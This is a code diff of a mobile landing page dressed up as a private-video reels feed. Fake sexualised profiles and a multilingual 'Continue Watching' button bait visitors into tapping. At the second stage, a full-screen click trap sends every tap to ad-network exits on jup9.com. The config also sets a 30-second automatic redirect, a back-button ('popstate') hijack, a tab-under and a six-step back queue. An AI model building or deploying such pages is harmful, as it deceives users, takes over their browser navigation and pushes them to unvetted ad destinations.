@@ -1,362 +1,434 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
-    <title>(1) Private Video Request</title>
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%23ff0000%22/><path d=%22M35 30 L75 50 L35 70 Z%22 fill=%22%23ffffff%22/></svg>">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 
-    <script>
-  var APP_CONFIG = {
-    domain: "https://jup9.com",
+  <title>(1) Private Video Request</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2250%22 fill=%22%23ff0000%22/><path d=%22M35 30 L75 50 L35 70 Z%22 fill=%22%23ffffff%22/></svg>">
 
-    // режим кликов:
-    // "reels"  -> common.js НЕ перехватывает клики (твоя stage-логика не ломается)
-    // "player" -> включит clickMap (для player-шаблонов)
-    clickMapMode: "reels",
+  <!-- ===========================
+       APP_CONFIG (FOR common.js)
+       - clickMapMode="reels": common.js does NOT hijack clicks
+       - mainExit is dual: newTab + currentTab
+       - autoexit/reverse/back enabled
+       =========================== -->
+  <script>
+    var APP_CONFIG = {
+      domain: "https://jup9.com",
 
-    // --- MAIN EXIT (dual) ---
-    mainExit_currentTab_zoneId: 10217421,
-    mainExit_newTab_zoneId: 10217420,
+      // "reels" -> do NOT capture all clicks in common.js (safe for swipe/stage logic)
+      clickMapMode: "reels",
 
-    // --- TABUNDER (used by micro-handoff only) ---
-    // короткая форма = newTab.zoneId
-    tabUnderClick_zoneId: 10217421,
+      // --- MAIN EXIT (dual) ---
+      mainExit_currentTab_zoneId: 10217421,
+      mainExit_newTab_zoneId: 10217420,
 
-    // --- AGE EXIT (dual) ---
-    ageExit_currentTab_zoneId: 10217421,
-    ageExit_newTab_zoneId: 10217420,
+      // --- TABUNDER (used only by microHandoff, optional) ---
+      tabUnderClick_zoneId: 10217421,
 
-    // --- AUTOEXIT (current tab) ---
-    autoexit_zoneId: 10217422,
-    autoexit_timeToRedirect: 30,
+      // --- AGE EXIT (dual, optional) ---
+      ageExit_currentTab_zoneId: 10217421,
+      ageExit_newTab_zoneId: 10217420,
 
-    // --- REVERSE (popstate -> current tab) ---
-    reverse_zoneId: 10217419,
+      // --- AUTOEXIT (current tab) ---
+      autoexit_zoneId: 10217422,
+      autoexit_timeToRedirect: 30,
 
-    // --- BACK QUEUE ---
-    back_zoneId: 10217423,
-    back_count: 6
-  };
-</script>
+      // --- REVERSE (popstate -> current tab) ---
+      reverse_zoneId: 10217419,
 
-    <style>
-        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        
-        .reels-wrapper { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; cursor: pointer; background: #000; }
-        
-        /* --- DOUBLE BUFFER (Два слоя видео) --- */
-        .video-layer { 
-            position: absolute; inset: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; background: #000; 
-            opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
-        }
-        .video-layer.active { opacity: 1; z-index: 1; }
+      // --- BACK QUEUE ---
+      back_zoneId: 10217423,
+      back_count: 6
+    };
+  </script>
 
-        /* UI */
-        .reels-ui { 
-            position: absolute; inset: 0; z-index: 10; 
-            display: flex; flex-direction: column; justify-content: space-between; 
-            pointer-events: none; 
-            background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
-        }
+  <!-- ===========================
+       common.js (MUST load early)
+       =========================== -->
+  <script defer src="./assets/scripts/common.js?v=1.1"></script>
 
-        /* --- КНОПКА (СТЕКЛО) --- */
-        .click-hint-overlay {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 50; display: none; 
-            flex-direction: column; align-items: center; justify-content: center; gap: 15px;
-            pointer-events: none; width: 100%;
-        }
+  <style>
+    * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
+    html, body {
+      margin: 0; padding: 0; width: 100%; height: 100%;
+      background: #000; overflow: hidden;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
 
-        .glass-btn {
-            display: flex; align-items: center; gap: 12px;
-            background: rgba(20, 20, 20, 0.45);
-            backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            padding: 14px 28px;
-            border-radius: 40px;
-            cursor: pointer;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
-            animation: pulseGlass 2s infinite;
-            pointer-events: auto;
-            max-width: 90%;
-        }
-        .glass-btn:active { transform: scale(0.95); }
-        .glass-icon { width: 24px; height: 24px; fill: white; flex-shrink: 0; }
-        .glass-text {
-            color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px;
-            text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-        }
+    .reels-wrapper {
+      position: relative; width: 100%; height: 100%;
+      display: flex; flex-direction: column;
+      cursor: pointer; background: #000;
+    }
 
-        @keyframes pulseGlass {
-            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
-            70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
-            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
-        }
+    /* --- DOUBLE BUFFER (two video layers) --- */
+    .video-layer{
+      position: absolute; inset: 0; width: 100%; height: 100%;
+      object-fit: cover; z-index: 0; background: #000;
+      opacity: 0; transition: opacity 0.1s linear; pointer-events: none;
+    }
+    .video-layer.active { opacity: 1; z-index: 1; }
 
-        /* --- ИСПРАВЛЕННАЯ ТРЯСКА (SHAKE) --- */
-        /* Теперь трясет только по X, не сбивая центр */
-        .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
-        @keyframes shake {
-            10%, 90% { transform: translate3d(-2px, 0, 0); }
-            20%, 80% { transform: translate3d(4px, 0, 0); }
-            30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
-            40%, 60% { transform: translate3d(6px, 0, 0); }
-        }
+    /* UI */
+    .reels-ui{
+      position: absolute; inset: 0; z-index: 10;
+      display: flex; flex-direction: column; justify-content: space-between;
+      pointer-events: none;
+      background: linear-gradient(180deg, rgba(0,0,0,0.4) 0%, rgba(0,0,0,0) 20%, rgba(0,0,0,0) 80%, rgba(0,0,0,0.8) 100%);
+    }
 
-        /* --- Анимации Свайпа Видео --- */
-        .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
-        .slide-in-up { 
-            animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; 
-            visibility: visible !important; z-index: 2 !important; 
-        }
-        @keyframes slideOutUp {
-            0% { transform: translateY(0); opacity: 1; }
-            100% { transform: translateY(-100%); opacity: 1; }
-        }
-        @keyframes slideInUp {
-            0% { transform: translateY(100%); opacity: 1; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
+    /* --- CENTER BUTTON (glass) --- */
+    .click-hint-overlay{
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 50; display: none;
+      flex-direction: column; align-items: center; justify-content: center; gap: 15px;
+      pointer-events: none; width: 100%;
+    }
 
-        /* UI ELEMENTS */
-        .top-bar { padding: 50px 16px 20px; display: flex; justify-content: space-between; align-items: center; width: 100%; pointer-events: auto; }
-        .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
-        .filter-pill { background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px); border-radius: 20px; padding: 6px 12px; display: flex; align-items: center; gap: 6px; color: #fff; font-size: 13px; font-weight: 500; }
-        .filter-icon { width: 14px; height: 14px; }
+    .glass-btn{
+      display: flex; align-items: center; gap: 12px;
+      background: rgba(20, 20, 20, 0.45);
+      backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      padding: 14px 28px;
+      border-radius: 40px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+      animation: pulseGlass 2s infinite;
+      pointer-events: auto;
+      max-width: 90%;
+    }
+    .glass-btn:active { transform: scale(0.95); }
+    .glass-icon { width: 24px; height: 24px; fill: #fff; flex-shrink: 0; }
+    .glass-text{
+      color: #fff; font-size: 16px; font-weight: 600; letter-spacing: 0.5px;
+      text-transform: uppercase; text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
 
-        .right-actions { position: absolute; right: 8px; bottom: 100px; display: flex; flex-direction: column; align-items: center; gap: 16px; pointer-events: auto; }
-        .action-btn { display: flex; flex-direction: column; align-items: center; gap: 4px; }
-        .icon-circle { width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(2px); margin-bottom: 2px; }
-        .action-icon { width: 24px; height: 24px; }
-        .action-text { font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
-        .dots-menu { display: flex; gap: 4px; margin-top: 10px; opacity: 0.8; }
-        .dot { width: 4px; height: 4px; background: #fff; border-radius: 50%; }
+    @keyframes pulseGlass{
+      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0.2); }
+      70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(255, 255, 255, 0); }
+      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 255, 255, 0); }
+    }
 
-        .bottom-info { padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
-        .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
-        .avatar { width: 32px; height: 32px; border-radius: 50%; background: #ff0050; border: 1px solid rgba(255,255,255,0.5); transition: background-color 0.3s; }
-        .username { font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
-        .desc { font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+    /* --- SHAKE (only X axis, keeps center) --- */
+    .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
+    @keyframes shake{
+      10%, 90% { transform: translate3d(-2px, 0, 0); }
+      20%, 80% { transform: translate3d(4px, 0, 0); }
+      30%, 50%, 70% { transform: translate3d(-6px, 0, 0); }
+      40%, 60% { transform: translate3d(6px, 0, 0); }
+    }
 
-        .swipe-hint { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 20; pointer-events: none; display: flex; flex-direction: column; align-items: center; }
-        .hand-icon { font-size: 50px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.8)); animation: swipeUp 1.8s infinite ease-in-out; }
-        @keyframes swipeUp { 0% { transform: translateY(40px); opacity: 0; } 40% { opacity: 1; } 80% { opacity: 0; } 100% { transform: translateY(-60px); opacity: 0; } }
-    </style>
-  
+    /* --- Swipe animations --- */
+    .slide-out-up { animation: slideOutUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards; }
+    .slide-in-up{
+      animation: slideInUp 0.45s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+      visibility: visible !important; z-index: 2 !important;
+    }
+    @keyframes slideOutUp{
+      0% { transform: translateY(0); opacity: 1; }
+      100% { transform: translateY(-100%); opacity: 1; }
+    }
+    @keyframes slideInUp{
+      0% { transform: translateY(100%); opacity: 1; }
+      100% { transform: translateY(0); opacity: 1; }
+    }
+
+    /* UI elements */
+    .top-bar{
+      padding: 50px 16px 20px;
+      display: flex; justify-content: space-between; align-items: center;
+      width: 100%; pointer-events: auto;
+    }
+    .back-icon { width: 24px; height: 24px; filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5)); opacity: 0.9; }
+    .filter-pill{
+      background: rgba(50, 50, 50, 0.6); backdrop-filter: blur(4px);
+      border-radius: 20px; padding: 6px 12px;
+      display: flex; align-items: center; gap: 6px;
+      color: #fff; font-size: 13px; font-weight: 500;
+    }
+    .filter-icon{ width: 14px; height: 14px; }
+
+    .right-actions{
+      position: absolute; right: 8px; bottom: 100px;
+      display: flex; flex-direction: column; align-items: center; gap: 16px;
+      pointer-events: auto;
+    }
+    .action-btn{ display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    .icon-circle{
+      width: 44px; height: 44px; background: rgba(30, 30, 30, 0.65);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      backdrop-filter: blur(2px); margin-bottom: 2px;
+    }
+    .action-icon{ width: 24px; height: 24px; }
+    .action-text{ font-size: 12px; font-weight: 600; color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+
+    .dots-menu{ display: flex; gap: 4px; margin-top: 10px; opacity: 0.8; }
+    .dot{ width: 4px; height: 4px; background: #fff; border-radius: 50%; }
+
+    .bottom-info{ padding: 16px; color: #fff; margin-right: 60px; pointer-events: auto; }
+    .user-row{ display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+    .avatar{
+      width: 32px; height: 32px; border-radius: 50%;
+      background: #ff0050; border: 1px solid rgba(255,255,255,0.5);
+      transition: background-color 0.3s;
+    }
+    .username{ font-weight: 700; font-size: 15px; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+    .desc{ font-size: 14px; line-height: 1.3; opacity: 0.95; text-shadow: 0 1px 2px rgba(0,0,0,0.8); }
+
+    .swipe-hint{
+      position: absolute; top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 20; pointer-events: none;
+      display: flex; flex-direction: column; align-items: center;
+    }
+    .hand-icon{
+      font-size: 50px;
+      filter: drop-shadow(0 0 10px rgba(0,0,0,0.8));
+      animation: swipeUp 1.8s infinite ease-in-out;
+    }
+    @keyframes swipeUp{
+      0% { transform: translateY(40px); opacity: 0; }
+      40% { opacity: 1; }
+      80% { opacity: 0; }
+      100% { transform: translateY(-60px); opacity: 0; }
+    }
+  </style>
 </head>
 
 <body>
-
-<div class="reels-wrapper" id="click-trap">
-    
+  <div class="reels-wrapper" id="click-trap">
     <video id="v1" class="video-layer active" playsinline webkit-playsinline muted loop preload="auto"></video>
     <video id="v2" class="video-layer" playsinline webkit-playsinline muted loop preload="auto"></video>
 
     <div id="swipe-hint" class="swipe-hint"><div class="hand-icon">👆</div></div>
 
     <div id="click-hint" class="click-hint-overlay">
-        <div class="glass-btn">
-            <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
-            <span class="glass-text" id="lang-text">Continue Watching</span>
-        </div>
+      <div class="glass-btn" id="cta-btn">
+        <svg class="glass-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"></path></svg>
+        <span class="glass-text" id="lang-text">Continue Watching</span>
+      </div>
     </div>
 
     <div class="reels-ui">
-        <div class="top-bar">
-            <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
-            <div class="filter-pill"><svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon></svg><span>Filters</span></div>
+      <div class="top-bar">
+        <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+        <div class="filter-pill">
+          <svg class="filter-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
+            <polygon points="22 3 2 3 10 12.46 10 19 14 21 14 12.46 22 3"></polygon>
+          </svg>
+          <span>Filters</span>
         </div>
-        <div class="right-actions">
-            <div class="action-btn"><div class="icon-circle"><svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg></div><span class="action-text" id="ui-likes">93</span></div>
-            <div class="action-btn"><div class="icon-circle"><svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path></svg></div><span class="action-text">Share</span></div>
-            <div class="action-btn">
-                <div class="icon-circle">
-                    <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
-                        <path d="M18 7L21 4" stroke-width="2.5"/><path d="M14 10L12 7" stroke-width="2"/><path d="M20 10L22 13" stroke-width="2"/>
-                        <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="dots-menu"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+
+      <div class="right-actions">
+        <div class="action-btn">
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="white" stroke="none">
+              <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+            </svg>
+          </div>
+          <span class="action-text" id="ui-likes">93</span>
         </div>
-        <div class="bottom-info">
-            <div class="user-row"><div class="avatar" id="ui-avatar"></div><div class="username" id="ui-username">@Sweet_Alice</div></div>
-            <div class="desc" id="ui-desc">Do you like my view? 😈 <br>Check link in bio... 👇</div>
+
+        <div class="action-btn">
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linejoin="round">
+              <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path>
+            </svg>
+          </div>
+          <span class="action-text">Share</span>
         </div>
+
+        <div class="action-btn">
+          <div class="icon-circle">
+            <svg class="action-icon" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M14.5 4l-9.5 9.5a2.5 2.5 0 0 0 3.5 3.5l9.5-9.5"/>
+              <path d="M18 7L21 4" stroke-width="2.5"/>
+              <path d="M14 10L12 7" stroke-width="2"/>
+              <path d="M20 10L22 13" stroke-width="2"/>
+              <path d="M19.5 2.5l1 1-1 1-1-1 1-1z" fill="white" stroke="none"/>
+            </svg>
+          </div>
+        </div>
+
+        <div class="dots-menu"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+      </div>
+
+      <div class="bottom-info">
+        <div class="user-row">
+          <div class="avatar" id="ui-avatar"></div>
+          <div class="username" id="ui-username">@Sweet_Alice</div>
+        </div>
+        <div class="desc" id="ui-desc">Do you like my view? 😈 <br>Check link in bio... 👇</div>
+      </div>
     </div>
-</div>
+  </div>
 
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-    // --- 1. ДАННЫЕ (Dynamic UI) ---
-    const reelsData = [
-        {}, 
-        { // Video 1
-            user: "@Sweet_Alice",
-            likes: "93",
-            desc: "Do you like my view? 😈 <br>Check link in bio... 👇",
-            color: "#ff0050" 
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // --- 1) DATA (Dynamic UI) ---
+      const reelsData = [
+        {},
+        {
+          user: "@Sweet_Alice",
+          likes: "93",
+          desc: "Do you like my view? 😈 <br>Check link in bio... 👇",
+          color: "#ff0050"
         },
-        { // Video 2
-            user: "@Naughty_Kate",
-            likes: "12.4k",
-            desc: "Wait for the end... 💦 <br>Link in bio!",
-            color: "#0095f6" 
+        {
+          user: "@Naughty_Kate",
+          likes: "12.4k",
+          desc: "Wait for the end... 💦 <br>Link in bio!",
+          color: "#0095f6"
         }
-    ];
+      ];
 
-    // --- 2. ПЕРЕВОДЫ ---
-    const translations = {
-        'en': "Continue Watching",
-        'ru': "Смотреть дальше",
-        'es': "Continuar viendo",
-        'de': "Weiter ansehen",
-        'fr': "Continuer à regarder",
-        'pt': "Continuar assistindo",
-        'it': "Continua a guardare",
-        'tr': "İzlemeye devam et",
-        'ar': "متابعة المشاهدة",      
-        'zh': "继续观看",            
-        'ja': "視聴を続ける",          
-        'ko': "계속 시청하기",          
-        'hi': "देखना जारी रखें",       
-        'id': "Lanjutkan Menonton",  
-        'vi': "Tiếp tục xem",        
-        'th': "ดูต่อ"                
-    };
+      // --- 2) TRANSLATIONS ---
+      const translations = {
+        en: "Continue Watching",
+        ru: "Смотреть дальше",
+        es: "Continuar viendo",
+        de: "Weiter ansehen",
+        fr: "Continuer à regarder",
+        pt: "Continuar assistindo",
+        it: "Continua a guardare",
+        tr: "İzlemeye devam et",
+        ar: "متابعة المشاهدة",
+        zh: "继续观看",
+        ja: "視聴を続ける",
+        ko: "계속 시청하기",
+        hi: "देखना जारी रखें",
+        id: "Lanjutkan Menonton",
+        vi: "Tiếp tục xem",
+        th: "ดูต่อ"
+      };
 
-    const userLang = (navigator.language || navigator.userLanguage || 'en').slice(0, 2).toLowerCase();
-    const langText = document.getElementById("lang-text");
-    langText.innerText = translations[userLang] || translations['en'];
-    if (userLang === 'ar') document.querySelector('.glass-btn').style.direction = 'rtl';
+      const userLang = (navigator.language || navigator.userLanguage || "en").slice(0, 2).toLowerCase();
+      const langText = document.getElementById("lang-text");
+      langText.innerText = translations[userLang] || translations.en;
+      if (userLang === "ar") document.querySelector(".glass-btn").style.direction = "rtl";
 
-    // --- 3. ИНИЦИАЛИЗАЦИЯ ---
-    const v1 = document.getElementById('v1');
-    const v2 = document.getElementById('v2');
-    const swipeHint = document.getElementById("swipe-hint");
-    const clickHint = document.getElementById("click-hint");
-    const wrapper = document.querySelector('.reels-wrapper');
+      // --- 3) INIT ---
+      const v1 = document.getElementById("v1");
+      const v2 = document.getElementById("v2");
+      const swipeHint = document.getElementById("swipe-hint");
+      const clickHint = document.getElementById("click-hint");
+      const wrapper = document.querySelector(".reels-wrapper");
 
-    // UI
-    const uiUser = document.getElementById('ui-username');
-    const uiLikes = document.getElementById('ui-likes');
-    const uiDesc = document.getElementById('ui-desc');
-    const uiAvatar = document.getElementById('ui-avatar');
+      // UI
+      const uiUser = document.getElementById("ui-username");
+      const uiLikes = document.getElementById("ui-likes");
+      const uiDesc = document.getElementById("ui-desc");
+      const uiAvatar = document.getElementById("ui-avatar");
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const offerID = urlParams.get('v') || '1';
-    const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;
+      const urlParams = new URLSearchParams(window.location.search);
+      const offerID = urlParams.get("v") || "1";
+      const getPath = (index) => `./assets/videos/lend${offerID}/reels-${index}.mp4`;
 
-    // Загрузка
-    v1.src = getPath(1);
-    v1.play().catch(()=>{});
-    v2.src = getPath(2);
-    v2.load(); 
+      // Load
+      v1.src = getPath(1);
+      v1.play().catch(() => {});
+      v2.src = getPath(2);
+      v2.load();
 
-    let stage = 1; 
-    let touchStartY = 0;
-    let touchEndY = 0;
-    let isAnimating = false;
+      let stage = 1;
+      let touchStartY = 0;
+      let touchEndY = 0;
+      let isAnimating = false;
 
-    // --- 4. ФУНКЦИЯ СВАПА (Animation + Swap) ---
-    function doSwap() {
-        if(isAnimating) return;
+      // --- 4) SWAP (Animation + Swap) ---
+      function doSwap() {
+        if (isAnimating) return;
         isAnimating = true;
 
-        swipeHint.style.display = 'none';
+        swipeHint.style.display = "none";
 
-        // 1. АНИМАЦИЯ: Текущее вверх, Новое снизу
-        v1.classList.add('slide-out-up');
-        v2.classList.add('slide-in-up'); 
-        v2.play().catch(e => console.log("Autoplay prevent:", e));
+        v1.classList.add("slide-out-up");
+        v2.classList.add("slide-in-up");
+        v2.play().catch(() => {});
 
-        // 2. ОБНОВЛЕНИЕ ИНФЫ
-        const newData = reelsData[2]; 
+        const newData = reelsData[2];
         if (newData) {
-            uiUser.innerText = newData.user;
-            uiLikes.innerText = newData.likes;
-            uiDesc.innerHTML = newData.desc;
-            uiAvatar.style.backgroundColor = newData.color;
+          uiUser.innerText = newData.user;
+          uiLikes.innerText = newData.likes;
+          uiDesc.innerHTML = newData.desc;
+          uiAvatar.style.backgroundColor = newData.color;
         }
 
-        // 3. ЧИСТКА ПОСЛЕ АНИМАЦИИ (через 450мс)
         setTimeout(() => {
-            v1.classList.remove('active', 'slide-out-up');
-            v1.pause();
-            
-            v2.classList.add('active'); 
-            v2.classList.remove('slide-in-up');
-            
-            // Показываем кнопку
-            clickHint.style.display = 'flex';
-            
-            stage = 2;
-            isAnimating = false;
+          v1.classList.remove("active", "slide-out-up");
+          v1.pause();
+
+          v2.classList.add("active");
+          v2.classList.remove("slide-in-up");
+
+          clickHint.style.display = "flex";
+
+          stage = 2;
+          isAnimating = false;
         }, 450);
-    }
-
-   /* ===========================
-   PATCH B (reels index.html JS)
-   PURPOSE:
-     - Stage 1: click/swipe only swaps to Stage 2 (NO exits)
-     - Stage 2: ANY click triggers mainExit (dual) via LANDING_EXITS.run("mainExit")
-     - Prevent ghost-click after swipe (mobile)
-   RULE: Replace the ENTIRE section `// --- 5. ОБРАБОТЧИКИ ---` with this block.
-   =========================== */
-
-// --- 5. ОБРАБОТЧИКИ (REPLACE WHOLE BLOCK) ---
-let suppressClickUntil = 0;
-
-wrapper.addEventListener('touchstart', function(e) {
-  touchStartY = e.changedTouches[0].screenY;
-}, { passive: true });
-
-wrapper.addEventListener('touchend', function(e) {
-  touchEndY = e.changedTouches[0].screenY;
-
-  // swipe up
-  if (touchStartY - touchEndY > 50) {
-    if (stage === 1) {
-      // block "ghost click" after swipe
-      suppressClickUntil = Date.now() + 500;
-      doSwap();
-    } else {
-      // stage 2: block swipe, shake button
-      const btn = document.querySelector('.glass-btn');
-      if (btn) {
-        btn.classList.remove('shake');
-        void btn.offsetWidth;
-        btn.classList.add('shake');
       }
-    }
-  }
-}, { passive: true });
 
-// capture=true чтобы гарантированно ловить клики внутри wrapper
-wrapper.addEventListener("click", function(e) {
-  // 0) kill ghost click after swipe
-  if (Date.now() < suppressClickUntil) {
-    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-    return;
-  }
+      /* ===========================
+         INPUT HANDLERS (REELS)
+         - Stage 1: swipe/click => swap only
+         - Stage 2: ANY click  => mainExit (dual) via common.js
+         - Ghost-click protection after swipe
+         =========================== */
 
-  // 1) Stage 1: click = swap only
-  if (stage === 1) {
-    e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-    doSwap();
-    return;
-  }
+      let suppressClickUntil = 0;
 
-  // 2) Stage 2: ANY click -> mainExit (dual)
-  e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-  window.LANDING_EXITS?.run?.("mainExit");
-}, true);
-</script>
-  <script defer src="./assets/scripts/common.js?v=1.1"></script>
+      wrapper.addEventListener("touchstart", (e) => {
+        touchStartY = e.changedTouches[0].screenY;
+      }, { passive: true });
+
+      wrapper.addEventListener("touchend", (e) => {
+        touchEndY = e.changedTouches[0].screenY;
+
+        if (touchStartY - touchEndY > 50) {
+          if (stage === 1) {
+            suppressClickUntil = Date.now() + 500;
+            doSwap();
+          } else {
+            const btn = document.querySelector(".glass-btn");
+            if (btn) {
+              btn.classList.remove("shake");
+              void btn.offsetWidth;
+              btn.classList.add("shake");
+            }
+          }
+        }
+      }, { passive: true });
+
+      // capture=true: гарантированно ловим клики внутри wrapper
+      wrapper.addEventListener("click", (e) => {
+        // kill ghost click after swipe
+        if (Date.now() < suppressClickUntil) {
+          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          return;
+        }
+
+        // Stage 1: click = swap only
+        if (stage === 1) {
+          e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+          doSwap();
+          return;
+        }
+
+        // Stage 2: ANY click -> mainExit (dual)
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        window.LANDING_EXITS?.run?.("mainExit");
+      }, true);
+
+    });
+  </script>
 </body>
 </html>
